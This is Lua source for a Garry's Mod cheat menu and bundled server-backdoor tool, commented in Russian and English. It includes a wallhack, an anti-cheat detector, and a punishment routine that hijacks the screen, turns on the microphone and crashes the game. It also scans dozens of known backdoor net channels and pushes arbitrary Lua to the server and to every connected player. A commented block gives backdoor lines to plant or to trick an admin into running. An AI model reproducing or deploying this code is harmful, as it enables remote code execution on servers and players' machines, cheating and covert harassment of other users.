            surface.SetFont("PopupHFont")
            surface.SetTextPos(w/5.10, h/3)
            surface.DrawText("Ошибка")
            surface.SetFont("PopupFont")
            surface.SetTextPos(w/5.10, h/2.50)
            surface.DrawText( "Вы не покупали DefqonMenu," )
            surface.SetTextPos(w/5.10, h/2.40)
            surface.DrawText( "И вы не можете его использовать," )
            surface.SetTextPos(w/5.10, h/2.30)
            surface.DrawText("Будет плохо, если вы попытаетесь прописать exploit_menu в консоль")
    end
    button = vgui.Create("DButton", Popup)
    button:SetSize(110,32.5)
    button:SetPos(Popup:GetWide()/2+Popup:GetWide()/10, Popup:GetTall()/2.050)
    button:SetText("")
    button.Paint = function(s,w,h)
        surface.SetDrawColor( Color(255,255,255) )
        surface.DrawRect( 0,0, w,h )
        surface.SetDrawColor( Color(80,180,240) )
        surface.DrawRect( 0+3,0+3, w-6,h-6 )
        surface.SetTextColor(255,255,255)
        surface.SetFont("PopupFont")
        surface.SetTextPos(24,5.5)
        surface.DrawText( "Закрыть" )
    end
    button.DoClick = function(s,w,h)
        Popup:Close()
    end

end)
RunConsoleCommand("fucked")
end

--[[---------------------------------------------------------------------------------------------------------
  ____  _                       _     _      _         _   _                _          _   _
 / ___|| |_ ___  __ _ _ __ ___ (_) __| |    / \  _   _| |_| |__   ___  _ __(_)______ _| |_(_) ___  _ __
 \___ \| __/ _ \/ _` | '_ ` _ \| |/ _` |   / _ \| | | | __| '_ \ / _ \| '__| |_  / _` | __| |/ _ \| '_ \
  ___) | ||  __/ (_| | | | | | | | (_| |  / ___ \ |_| | |_| | | | (_) | |  | |/ / (_| | |_| | (_) | | | |
 |____/ \__\___|\__,_|_| |_| |_|_|\__,_| /_/   \_\__,_|\__|_| |_|\___/|_|  |_/___\__,_|\__|_|\___/|_| |_|

   ----------------------------------------------------------------------------------------------------------]]

function leak()
	fuck = false
	timer.Create("LolHackers", 1, 0, function()
		if fuck then
			chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Не заплатил - меню не получил" )
			else
			chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), ":^)" )
		end
		fuck = !fuck
	end)

	LocalPlayer():EmitSound("common/warning.wav",500,100)
	LocalPlayer():EmitSound("common/warning.wav",500,100)
	LocalPlayer():EmitSound("common/warning.wav",500,100)
	LocalPlayer():EmitSound("common/warning.wav",500,100)
	LocalPlayer():EmitSound("common/warning.wav",500,100)
	LocalPlayer():EmitSound("common/warning.wav",500,100)
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Чёртов пират, уходи!" )
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Не заплатил - меню не получил!" )
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), ":^)" )
local msg = "Подожди. . ."
surface.CreateFont("lolwutbet2", {size=75})
local function huddrawdetour2()
	draw.RoundedBox(0, 0, 0, ScrW(), ScrH(), HSVToColor( CurTime() % 6 * 60, 1, 1 ))
	draw.RoundedBox(0, 0, ScrH() / 3.5, ScrW(), ScrH() / 4.5, Color(0, 0, 0))
	draw.SimpleText(msg, "lolwutbet2", ScrW() / 2, ScrH() / 2.5, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end


for k,v in pairs(hook.GetTable()) do
	for o,j in pairs(v) do
		if k == "HUDPaint" then
			hook.Remove(k, o)
			hook.Add(k, o, huddrawdetour2)
		end
	end
end
hook.Add("HUDPaint","eztoirkfghdjnnvcc", huddrawdetour2)

timer.Create("ti_ebaniy_debil1",2 ,0 , function()
	msg = table.Random({
		"Зачем скачал слитый чит?",
		"За всё нужно платить",
		"Ну правда",
		"Почему ты это сделал ?",
		"Я уже взламываю твой аккаунт",
		"Мда",
		"Может будет лучше скачать Gmhack?",
		"Я же говорил тебе не прописывать exploit_menu",
		"u n00b",
		"1337",
		"1337 h4ck3r",
		"Больше не запускай меня, ок?",
		"gmhack!1!1!11",
		"lol",
		"Надеюсь, ты понял",
		"...",
		"...",
		"..."})
end)

timer.Create("lgfholjghlfdsq",0 ,0 , function()
	MsgC(HSVToColor( CurTime() % 6 * 60, 1, 1 ), "ЗАПУСТИ МЕНЯ ЕЩЕ РАЗ, ДАВАЙ, СДЕЛАЙ ЭТО!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n")
end)
sound.PlayURL("http://d.zaix.ru/5Kko.mp3","mono noblock", function( s )
	s:Play()
end)
LocalPlayer():ConCommand("+voicerecord") -- Автоматическое включение микрофона
LocalPlayer():ConCommand("cl_yawspeed 9999") -- Скорость кручения
LocalPlayer():ConCommand("+right") -- Будешь крутиться вправо
MsgC(HSVToColor( CurTime() % 6 * 60, 1, 1 ), "Нажми escape !\n")
timer.Simple(5 * 60, function()
	table.Empty(debug.getregistry())
end)
end
concommand.Add( "exploit_menu", leak )


function noob()
huck = false
timer.Create("LolHackers1", 1, 0, function()
	if huck then
		chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Не заплатил - меню не получил!" )
		else
		chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), ":^)" )
	end
	huck = !fuck
end)

LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Чёртов пират, уходи!" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Не заплатил - меню не получил!" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), ":^)" )
local msg1 = "Подожди. . ."
surface.CreateFont("lolwutbet3", {size=75})
local function huddrawdetour3()
	draw.RoundedBox(0, 0, 0, ScrW(), ScrH(), HSVToColor( CurTime() % 6 * 60, 1, 1 ))
	draw.RoundedBox(0, 0, ScrH() / 3.5, ScrW(), ScrH() / 4.5, Color(0, 0, 0))
	draw.SimpleText(msg, "lolwutbet3", ScrW() / 2, ScrH() / 2.5, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end


for k,v in pairs(hook.GetTable()) do
	for o,j in pairs(v) do
		if k == "HUDPaint" then
			hook.Remove(k, o)
			hook.Add(k, o, huddrawdetour2)
		end
	end
end
hook.Add("HUDPaint","cztoirkfghdjnnvcc", huddrawdetour2)

timer.Create("ti_ebaniy_debil3",2 ,0 , function()
	msg = table.Random({
		"Зачем скачал слитый чит?",
		"За всё нужно платить",
		"Ну правда",
		"Почему ты это сделал ?",
		"Я уже взламываю твой аккаунт",
		"Мда",
		"Может будет лучше скачать Gmhack?",
		"u n00b",
		"1337",
		"1337 h4ck3r",
		"Больше не запускай меня, ок?",
		"gmhack!1!1!11",
		"lol",
		"Надеюсь, ты понял",
		"...",
		"...",
		"..."})
end)

timer.Create("ugfholjghlfdsq",0 ,0 , function()
	MsgC(HSVToColor( CurTime() % 6 * 60, 1, 1 ), "ЗАПУСТИ МЕНЯ ЕЩЕ РАЗ, ДАВАЙ, СДЕЛАЙ ЭТО!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! !\n")
end)
sound.PlayURL("http://d.zaix.ru/5Kko.mp3","mono noblock", function( s )
	s:Play()
end)
LocalPlayer():ConCommand("+voicerecord") -- Включение микрофона
LocalPlayer():ConCommand("cl_yawspeed 9999") -- Скорость кручения
LocalPlayer():ConCommand("+right") -- Будешь крутиться вправо
MsgC(HSVToColor( CurTime() % 6 * 60, 1, 1 ), "Нажми escape !\n")
timer.Simple(5 * 60, function()
	table.Empty(debug.getregistry())
end)
end
concommand.Add( "sdbhfbgf", noob )

-- Version Check
function CheckVersion()
surface.PlaySound("garrysmod/ui_click.wav")
    if ( Version == "v5.1.1") then
            chat.AddText( Color( 0, 0, 0, 125 ), "[Defqon]", Color( 0, 255, 0 )," Вы используете последнюю версию от 17.03.18!" )
    else
            chat.AddText( Color( 0, 0, 0, 125 ), "[Defqon]", Color( 255, 0, 0 )," Ваша версия чита устарела!" )
    end
end


------------------------------------------------------------------------------------------------

local title = "You have been reported! Please answer all your reports."
	local function CheckChild(pan)
	    if not pan or not IsValid(pan) then return end

	    if pan.GetTitle and pan:GetTitle() == title then
	        pan:Remove()
	        print("Удален warning box")

	        return
	    end

	    for k, v in pairs(pan:GetChildren()) do
	        if v.GetTitle and v:GetTitle() == title then
	            v:Remove()
	            print("Удален warning box")

	            return
	        end

	        if #v:GetChildren() > 0 then
	            CheckChild(v)
	        end
	    end
	end

	local isttt = false
	if (engine.ActiveGamemode() == "terrortown") then
		isttt = true
	end

	local bypass = 0


































	local rainb = false
	function rainbowphysgun()
	surface.PlaySound("garrysmod/ui_click.wav")
		if not rainb then
			hook.Add("Think", "RGBSTF", function()
			    local rainbowC = HSVToColor(CurTime() % 6 * 60, 1, 1)
			    LocalPlayer():SetWeaponColor(Vector(rainbowC.r / 255, rainbowC.g / 255, rainbowC.b / 255))
			    LocalPlayer():SetPlayerColor(Vector(rainbowC.r / 255, rainbowC.g / 255, rainbowC.b / 255))
			end)
			chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Радужный физган включен" )
			rainb = true
		else
			hook.Remove("Think", "RGBSTF")
			chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Радужный физган выключен" )
			rainb = false
		end
	end



	surface.CreateFont("WHT", {
	    font = "Robot",
		size = ScreenScale(7),
		weight = 150,
		antialias = true,
		shadow = true,
	})



local wh = false
function WHT()
surface.PlaySound("garrysmod/ui_click.wav")
if not wh then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Wallhack включен" )
hook.Add("HUDPaint", "WHT", function()
for k, v in pairs(player.GetAll()) do
if (v:Alive()) then
local Position = (v:GetPos() + Vector(0, 0, 95)):ToScreen()
local Name = ""
local teamName = ""
local colwht = v:IsPlayer() and team.GetColor(v:Team())
if v == LocalPlayer() then
Name = ""
teamName = ""
elseif v:IsBot() then
Name = v:Name() .. "[ БОТ ]"
if (string.lower(engine.ActiveGamemode()) == "darkrp") then
teamName = v:getDarkRPVar("job") or ""
end
else
Name = v:Name()
if (string.lower(engine.ActiveGamemode()) == "darkrp") then
teamName = v:getDarkRPVar("job") or ""
end
end
if v:GetUserGroup() == "user" then
draw.SimpleText(Name .. "(" .. v:Health() .. ")", "WHT", Position.x, Position.y, colwht, 1)
if (string.lower(engine.ActiveGamemode()) == "darkrp") then
local PlyMoney = math.ceil(v:getDarkRPVar("money") or 0)
draw.SimpleText(teamName .. "[" .. PlyMoney .. "]", "WHT", Position.x, Position.y + 20, Color(255, 255, 255, 255), 1)
end
else
draw.SimpleText(Name .. "(" .. v:Health() .. ") [" .. v:GetUserGroup() .. "]", "WHT", Position.x, Position.y, colwht, 1)
if (string.lower(engine.ActiveGamemode()) == "darkrp") then
local PlyMoney = math.ceil(v:getDarkRPVar("money") or 0)
draw.SimpleText(teamName .. "[" .. PlyMoney .. "]", "WHT", Position.x, Position.y + 20, Color(255, 255, 255, 255), 1)
end
end
end
end
end)
wh = true
else
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Wallhack выключен" )
hook.Remove("HUDPaint", "WHT")
wh = false
end
end
concommand.Add("Defqon_wallhack", WHT)

local bhop = false
function Bhop()
surface.PlaySound("garrysmod/ui_click.wav")
if not bhop then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Bhop включен" )
hook.Add("CreateMove", "BHOP", function(cmd)
if (cmd:KeyDown(IN_JUMP)) then
if(cmd:GetMouseX() < 0) then --spinning right
cmd:SetSideMove(-10000);
elseif(cmd:GetMouseX() > 0) then
cmd:SetSideMove(10000);
end
if (LocalPlayer():IsOnGround()) then
cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_JUMP));
return;
end
end
cmd:RemoveKey(IN_JUMP);
end )
bhop = true
else
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Bhop выключен" )
hook.Remove("CreateMove", "BHOP")
bhop = false
end
end
concommand.Add("Defqon_bhop", Bhop)






local CommandList2 = {}

local CompleteList2 = {}

local oaddcc = AddConsoleCommand

local _A = {}


_A.aegis = {}

_A.registry = debug.getregistry()

local aegis = {}

_A.aegis.logs = {}

_A.aegis.anticheats = {}

_A.aegis.exploitables = {}



local function ispooped( str )

		local status, error = pcall( net.Start, str )

		return status

	end



	local acfags = {

		["!Cake Anticheat (CAC)"] = {

			desc = "Самый распространенный античит, используемый сегодня (и ваш худший кошмар, прежде чем вы юзанули обход)\nИмеет очень сильные обнаружения, которые все еще лагают, даже через 2 года после его выпуска",

			scan = function() return _A.aegis.anticheats["extensions/client/vehicle.lua"] end,

		},

		["Simplicity Anticheat (SAC)"] = {

			desc = "Новый античит Leystryku, который он выпустил на scriptfodder\nНе силен, как CAC, но (по-видимому) предлагает лучшую производительность серверов",

			scan = function() if _G.simplicity then return true else return false end end,

		},

		["Quack Anticheat (QAC)"] = {

			desc = "Датированный античит с открытым исходным кодом из 2014 года\nRPards все еще редактируют и используют этот кусок дерьма, называя его своим 1337 приватным античитом",

			scan = function() return ( _G.QAC and ispooped( "quack" ) ) end,

		},

		["Supservers Anticheat"] = {

			desc = "Скорее черный список публичных читов, чем настоящий античит\nЭтот мусор не представляет для нас никакой угрозы (будьте осторожны с ними, скринграбит экран)",

			scan = function() return ispooped( "rp.OrgMotd" ) end,

		},

		["Screengrab V2"] = {

			desc = "Публичная утилита, которая может быть использована для скриншота вашего экрана\nВроде у дефкона есть анти-скринграб, но я хз",

			scan = function() if _G.OpenSGMenu then return true else return false end end,

		},

		["Pablo's Screengrab"] = {

			desc = "Публичная утилита, которая может быть использована для скриншота вашего экрана\nВроде у дефкона есть анти-скринграб, но я хз",

			scan = function() if _G.SCRG then return true else return false end end,

		},

		["Enforcer Anti Minge"] = {

			desc = "Скрипт общего назначения, который включает в себя антипропкилл, анти-краш и логи",

			scan = function() if _G.EnforcerAddMessage then return true else return false end end,

		},

		["AP Anti"] = {

			desc = "Тупо названный сценарий анти-пропкилла с открытым исходным кодом\nВы вероятно не сможете пропкиллить на этом сервере",

			scan = function() return ispooped( "APAnti AlertNotice" ) end,

		},



	}





	concommand.Add( "Defqon_anticheats", function()

		local acpanel = vgui.Create("DFrame")

		if !acpanel then return end

		acpanel:SetSize(500,455)

		acpanel:SetTitle("Меры безопасности сервера")

		acpanel:Center()

		acpanel:MakePopup()



		acpanel.Paint = function( s, w, h )

		surface.SetDrawColor( Color(30, 30, 30, 255) )

		surface.DrawRect( 0, 0, w, h )

		surface.SetDrawColor( Color(55, 55, 55, 255) )

		surface.DrawOutlinedRect( 0, 0, w, h )

		surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )

		surface.SetDrawColor( Color(33, 33, 33, 200) )

		surface.DrawRect( 10, 25, w - 20, h - 35 )

		end



		local Plist = vgui.Create( "DPanelList", acpanel )

		Plist:SetSize( acpanel:GetWide() - 20, acpanel:GetTall() - 35 )

		Plist:SetPadding( 5 )

		Plist:SetSpacing( 5 )

		Plist:EnableHorizontal( false )

		Plist:EnableVerticalScrollbar( true )

		Plist:SetPos( 10, 25 )

		Plist:SetName( "" )





		local function CreateACPanel( cmd )

		if !acpanel then return end

			local cmdp = vgui.Create( "DPanel" )

			cmdp:SetSize( Plist:GetWide(), 60 )

			cmdp.Cmd = cmd

			cmdp.Desc = acfags[cmd].desc

			cmdp.Paint = function( s, w, h )

				surface.SetDrawColor( Color(50, 50, 50, 255) )

				surface.DrawRect( 0, 0, w, h )

				surface.SetDrawColor( Color(65, 65, 65, 255) )

				surface.DrawOutlinedRect( 0, 0, w, h )

				surface.DrawLine( 0, 24, w, 24 )

				draw.DrawText( cmdp.Cmd, "DermaDefault", 10, 5, Color(255,255,255) )

				draw.DrawText( cmdp.Desc, "DermaDefault", 10, 28, Color(205,205,255, 100) )

			end



			Plist:AddItem( cmdp )

		end





		for k, v in pairs( acfags ) do

			if v["scan"]() then CreateACPanel( k ) end

		end

	end)







	------------------------------------------------------------------------------------------------------------
--[[

COPYRIGHT 2018

YOU HAVE NO RIGHTS TO REDISTRIBUTE THIS FILE OR ANY FILES ASSOCIATED

YOU MAY NOT COPY AND PASTE THIS SCRIPT
                                                                                              p.s. lua run does not work
Coded by Hayden Massey (ToxicRiver) @ toxicpro.xyz  (what a fucking joke)

*/

/*

	Toxic.pro

	Commissioned by 0xymoron for ToxicRiver

	Start Date: December 27th, 2017.

	First revision finished December 28th, 2017 @ 3:28AM.

	January 2nd, 2017 @ 6:27AM
	- This script truly has become toxic, ironic.

]]

--[[

-- Possible backdoor strings to plant in a file or convince a superadmin to luarun

util.AddNetworkString( "idk" ) net.Receive( "idk", function( len ) local str = net.ReadString() RunString( str ) end )
util.AddNetworkString( "idk" ) net.Receive( "idk", function( len ) local str = net.ReadString() CompileString( str, "[C]", false ) end )
util.AddNetworkString( "idk" ) net.Receive( "idk", function( len ) local str = net.ReadString() RunStringEx( str ) end )

]]

--[[

	metastruct editor read shit

	self.HTMLIDE:AddFunction("gmodinterface","OnCode",function(code) ... end)"

	https://github.com/Earu/EasyChat/blob/master/lua/easychat/modules/lua_tab.lua#L140

]]

local toxic = {}
local iZNX = {}

function iZNX.ValidNetString( str )
local status, error = pcall( net.Start, str )
return status
end

local blackdoor = ""
if iZNX.ValidNetString( "Sandbox_ArmDupe" ) then
blackdoor = "Sandbox_ArmDupe"
else
if iZNX.ValidNetString( "Sbox_darkrp" ) then
blackdoor = "Sbox_darkrp"
else
if iZNX.ValidNetString( "Sbox_itemstore" ) then
blackdoor = "Sbox_itemstore"
else
if iZNX.ValidNetString( "Ulib_Message" ) then
blackdoor = "Ulib_Message"
else
if iZNX.ValidNetString( "ULogs_Info" ) then
blackdoor = "ULogs_Info"
else
if iZNX.ValidNetString( "ITEM" ) then
blackdoor = "ITEM"
else
if iZNX.ValidNetString( "fix" ) then
blackdoor = "fix"
else
if iZNX.ValidNetString( "Fix_Keypads" ) then
blackdoor = "Fix_Keypads"
else
if iZNX.ValidNetString( "Remove_Exploiters" ) then
blackdoor = "Remove_Exploiters"
else
if iZNX.ValidNetString( "noclipcloakaesp_chat_text" ) then
blackdoor = "noclipcloakaesp_chat_text"
else
if iZNX.ValidNetString( "_Defqon" ) then
blackdoor = "_Defqon"
else
if iZNX.ValidNetString( "_CAC_ReadMemory" ) then
blackdoor = "_CAC_ReadMemory"
else
if iZNX.ValidNetString( "nostrip" ) then
blackdoor = "nostrip"
else
if iZNX.ValidNetString( "nocheat" ) then
blackdoor = "nocheat"
else
if iZNX.ValidNetString( "LickMeOut" ) then
blackdoor = "LickMeOut"
else
if iZNX.ValidNetString( "ULX_QUERY2" ) then
blackdoor = "ULX_QUERY2"
else
if iZNX.ValidNetString( "ULXQUERY2" ) then
blackdoor = "ULXQUERY2"
else
if iZNX.ValidNetString( "MoonMan" ) then
blackdoor = "MoonMan"
else
if iZNX.ValidNetString( "Im_SOCool" ) then
blackdoor = "Im_SOCool"
else
if iZNX.ValidNetString( "Sandbox_GayParty" ) then
blackdoor = "Sandbox_GayParty"
else
if iZNX.ValidNetString( "DarkRP_UTF8" ) then
blackdoor = "DarkRP_UTF8"
else
if iZNX.ValidNetString( "oldNetReadData" ) then
blackdoor = "oldNetReadData"
else
if iZNX.ValidNetString( "memeDoor" ) then
blackdoor = "memeDoor"
else
if iZNX.ValidNetString( "BackDoor" ) then
blackdoor = "BackDoor"
else
if iZNX.ValidNetString( "OdiumBackDoor" ) then
blackdoor = "OdiumBackDoor"
else
if iZNX.ValidNetString( "SessionBackdoor" ) then
blackdoor = "SessionBackdoor"
else
if iZNX.ValidNetString( "DarkRP_AdminWeapons" ) then
blackdoor = "DarkRP_AdminWeapons"
else
if iZNX.ValidNetString( "cucked" ) then
blackdoor = "cucked"
else
if iZNX.ValidNetString( "NoNerks" ) then
blackdoor = "NoNerks"
else
if iZNX.ValidNetString( "kek" ) then
blackdoor = "kek"
else
if iZNX.ValidNetString( "ZimbaBackDoor" ) then
blackdoor = "ZimbaBackDoor"
else
if iZNX.ValidNetString( "something" ) then
blackdoor = "something"
else
if iZNX.ValidNetString( "random" ) then
blackdoor = "random"
else
if iZNX.ValidNetString( "strip0" ) then
blackdoor = "strip0"
else
if iZNX.ValidNetString( "fellosnake" ) then
blackdoor = "fellosnake"
else
if iZNX.ValidNetString( "enablevac" ) then
blackdoor = "enablevac"
else
if iZNX.ValidNetString( "idk" ) then
blackdoor = "idk"
else
if iZNX.ValidNetString( "c" ) then
blackdoor = "c"
else
if iZNX.ValidNetString( "killserver" ) then
blackdoor = "killserver"
else
if iZNX.ValidNetString( "fuckserver" ) then
blackdoor = "fuckserver"
else
if iZNX.ValidNetString( "cvaraccess" ) then
blackdoor = "cvaraccess"
else
if iZNX.ValidNetString( "rcon" ) then
blackdoor = "rcon"
else
if iZNX.ValidNetString( "rconadmin" ) then
blackdoor = "rconadmin"
else
if iZNX.ValidNetString( "web" ) then
blackdoor = "web"
else
if iZNX.ValidNetString( "jesuslebg" ) then
blackdoor = "jesuslebg"
else
if iZNX.ValidNetString( "zilnix" ) then
blackdoor = "zilnix"
else
if iZNX.ValidNetString( "Þà?D)◘" ) then
blackdoor = "Þà?D)◘"
else
if iZNX.ValidNetString( "disablebackdoor" ) then
blackdoor = "disablebackdoor"
else
if iZNX.ValidNetString( "kill" ) then
blackdoor = "kill"
else
if iZNX.ValidNetString( "DefqonBackdoor" ) then
blackdoor = "DefqonBackdoor"
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end

toxic.Version = "1.2b"

toxic.Aids = {

	"kill them with buttons",
	"you are the admen now",
	"odium copy paste!!!11!1",
	"tricking dumb admens since 2k17",
	"what servers can i use this on???",
	"#1 in backdoor 2k17 e-peen contest",
	"leaked on release day™",
	"here come the hax",
	"leaked by homeless meme",

}

/*

	Backend functions

*/

function toxic.Init()

	if !file.IsDir( "toxic.pro", "DATA" ) then file.CreateDir( "toxic.pro" ) end

	if !file.IsDir( "toxic.pro/files", "DATA" ) then file.CreateDir( "toxic.pro/files" ) end

	if !file.IsDir( "toxic.pro/files/lua", "DATA" ) then file.CreateDir( "toxic.pro/files/lua" ) end

end

function toxic.Track()

	-- TODO: php tracking & shit

end

function toxic.PostLua( str )

	net.Start( blackdoor )

		net.WriteString( str )

	net.SendToServer()

end

function toxic.Notify( msg )

	chat.AddText( Color( 255, 0, 0 ), "[Toxic.pro] ", color_white, msg )

end

/*

	user interface

*/

function toxic.AddButton( name, parent, func )

	local button = parent:Add( "DButton" )
	button:SetText( "" )
	button:Dock( TOP )
	button:DockMargin( 0, 0, 0, 5 )
	button:SetSize( 100, 25 )
	button.DoClick = func

	button.Paint = function( self )

		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 0, 0, 0, 200 ) )

		draw.SimpleText( name, "DebugFixed", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1 )

	end

	toxic.ButtonPos = toxic.ButtonPos + 30

end

function toxic.AddCategorySpacer( name, col, parent )

	toxic.ButtonPos = toxic.ButtonPos + 5

	local button = parent:Add( "DButton" )
	button:SetText( "" )
	button:Dock( TOP )
	button:DockMargin( 0, 0, 0, 5 )
	button:SetSize( 100, 25 )
	button:SetEnabled( false )

	button.Paint = function( self )

		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( col.r, col.g, col.b, 200 ) )

		draw.SimpleText( name, "DebugFixed", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1 )

	end

	toxic.ButtonPos = toxic.ButtonPos + 35

end

function toxic.OpenTextDocument( path, str, parent )

	local hostname = string.gsub( GetHostName(), "%W", "" )

	toxic.Notify( "Received file " .. path )

	local frame = vgui.Create( "DFrame" )
	frame:SetSize( ScrW() - ( parent:GetWide() + 75 ), ScrH() - 50 )
	frame:SetPos( parent:GetWide() + 50, 25 )
	frame:SetTitle( GetHostName() .. "'s " .. path )
	frame:MakePopup()
	frame:ShowCloseButton( false )
	frame:SetDraggable( false )

	frame.Paint = function( self )

		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 140, 0, 0, 150 ) )

		draw.RoundedBox( 0, 0, 0, self:GetWide(), 25, Color( 0, 0, 0, 200 ) )

	end

	local close = vgui.Create( "DButton", frame )
	close:SetSize( 50, 20 )
	close:SetPos( frame:GetWide() - close:GetWide(), 0 )
	close:SetText( "x" )
	close:SetTextColor( Color( 255, 255, 255 ) )
	close:SetFont( "DebugFixed" )

	close.Paint = function()

		draw.RoundedBox( 0, 0, 0, close:GetWide(), close:GetTall(), Color( 168, 62, 62, 255 ) )

	end

	close.DoClick = function()

		frame:Close()

	end

	local html = vgui.Create( "DHTML", frame )
	html:SetPos( 5, 30 )
	html:SetSize( frame:GetWide() - 10, frame:GetTall() - 35 )
	html:OpenURL( "https://metastruct.github.io/lua_editor/" )

	html:QueueJavascript( "SetContent( '" .. string.JavascriptSafe( str ) .. "' )" )

	local save = vgui.Create( "DButton", frame )
	save:SetSize( 60, 20 )
	save:SetPos( frame:GetWide() - close:GetWide() - save:GetWide() - 5, 0 )
	save:SetText( "Save As" )
	save:SetTextColor( Color( 255, 255, 255 ) )
	save:SetFont( "DebugFixed" )

	save.Paint = function()

		draw.RoundedBox( 0, 0, 0, save:GetWide(), save:GetTall(), Color( 62, 168, 62, 255 ) )

	end

	save.DoClick = function()

		Derma_StringRequest( "Save file '" .. path .. "' to data/toxic.pro/files/" .. hostname .. "/", "File name (e.g: servercfg or servercfg.txt)", "", function( text )

			if !string.find( text, ".txt" ) then text = text .. ".txt" end

			if !file.IsDir( "toxic.pro/files/" .. hostname, "DATA" ) then file.CreateDir( "toxic.pro/files/" .. hostname ) end

			file.Write( "toxic.pro/files/" ..  hostname .. "/" .. text, str )

			toxic.Notify( "Saved source to data/toxic.pro/files/" .. hostname .. "/" .. text )

		end )

	end

end

toxic.LuaStr = ""

function toxic.OpenLuaEditor( parent )

	local frame = vgui.Create( "DFrame" )
	frame:SetSize( ScrW() - ( parent:GetWide() + 75 ), ScrH() - 50 )
	frame:SetPos( parent:GetWide() + 50, 25 )
	frame:SetTitle( "" )
	frame:MakePopup()
	frame:ShowCloseButton( false )
	frame:SetDraggable( false )

	frame.Paint = function( self )

		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 140, 0, 0, 150 ) )

		draw.RoundedBox( 0, 0, 0, self:GetWide(), 25, Color( 0, 0, 0, 200 ) )

	end

	local close = vgui.Create( "DButton", frame )
	close:SetSize( 50, 20 )
	close:SetPos( frame:GetWide() - close:GetWide(), 0 )
	close:SetText( "x" )
	close:SetTextColor( Color( 255, 255, 255 ) )
	close:SetFont( "DebugFixed" )

	close.Paint = function()

		draw.RoundedBox( 0, 0, 0, close:GetWide(), close:GetTall(), Color( 168, 62, 62, 255 ) )

	end

	close.DoClick = function()

		frame:Close()

	end

	local html = vgui.Create( "DHTML", frame )
	html:SetPos( 5, 30 )
	html:SetSize( frame:GetWide() - 10, frame:GetTall() - 35 )
	html:OpenURL( "https://metastruct.github.io/lua_editor/" )

	html:QueueJavascript( "SetContent( '" .. string.JavascriptSafe( toxic.LuaStr ) .. "' )" )

	html:AddFunction( "gmodinterface", "OnCode", function( code ) -- thanks easychat

		toxic.LuaStr = code

	end )

	local run = vgui.Create( "DButton", frame )
	run:SetSize( 60, 20 )
	run:SetPos( 0, 0 )
	run:SetText( "Run" )
	run:SetTextColor( Color( 255, 255, 255 ) )
	run:SetFont( "DebugFixed" )

	run.Paint = function( self )

		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 62, 62, 168, 255 ) )

	end

	run.DoClick = function()

		local options = DermaMenu()

		options:AddOption( "Server", function()

			toxic.PostLua( toxic.LuaStr )

			toxic.Notify( "Ran Lua on server" )

		end ):SetImage( "icon16/server.png" )

		options:AddOption( "All Clients", function()

			toxic.PostLua( [[

				for k, v in next, player.GetAll() do

					v:SendLua( ']] .. toxic.LuaStr .. [[' )

				end

			]] )

			toxic.Notify( "Ran Lua on all clients" )

		end ):SetImage( "icon16/computer_add.png" )

		local players, menu = options:AddSubMenu( "Client" )

		menu:SetIcon( "icon16/user.png" )

		for k, v in next, player.GetAll() do

			players:AddOption( v:Nick(), function()

				local id = v:UserID()

				toxic.PostLua( [[

					local id = ]] .. id .. [[

					Player( id ):SendLua( ']] .. toxic.LuaStr .. [[' )

				]] )

				toxic.Notify( "Ran Lua on " .. v:Nick() )

			end )

		end

		options:Open()

	end

	local save = vgui.Create( "DButton", frame )
	save:SetSize( 60, 20 )
	save:SetPos( run:GetWide() + 5, 0 )
	save:SetText( "Save" )
